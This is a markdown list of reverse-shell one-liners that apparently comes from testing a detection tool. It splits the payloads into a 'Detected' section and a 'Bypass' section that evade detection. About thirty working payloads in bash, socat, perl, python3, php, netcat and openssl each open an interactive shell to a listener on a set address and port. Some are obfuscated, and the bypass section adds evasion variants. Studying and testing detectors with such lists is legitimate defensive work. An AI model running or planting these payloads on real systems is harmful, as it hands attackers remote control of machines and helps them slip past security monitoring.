# General Reverse shells

## Detected

```bash

bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/127.0.0.1/4444 0<&1 2>&1

sh -i >& /dev/udp/127.0.0.1/4444 0>&1

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

export RHOST="127.0.0.1";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

python3 -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

python3 -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

python3 -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("127.0.0.1",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'

python3 -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("127.0.0.1",4444));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'

python3 -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("127.0.0.1",4444));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'

python3 -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("127.0.0.1",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'

python3 -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("127.0.0.1",4444));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'

python3 -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("127.0.0.1",4444));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'

python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("::1",4444,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

python3 -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("::1",4444,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

python3 -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("::1",4444,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'

php -r '$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");

php -r '$sock=fsockopen("127.0.0.1",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("127.0.0.1",4444);`/bin/sh -i <&3 >&3 2>&3`;'

php -r '$sock=fsockopen("127.0.0.1",4444);system("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("127.0.0.1",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("127.0.0.1",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

php -r '$sock=fsockopen("127.0.0.1",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f

rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:4444 > /tmp/s; rm /tmp/s


```

## Bypass

```bash

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null


```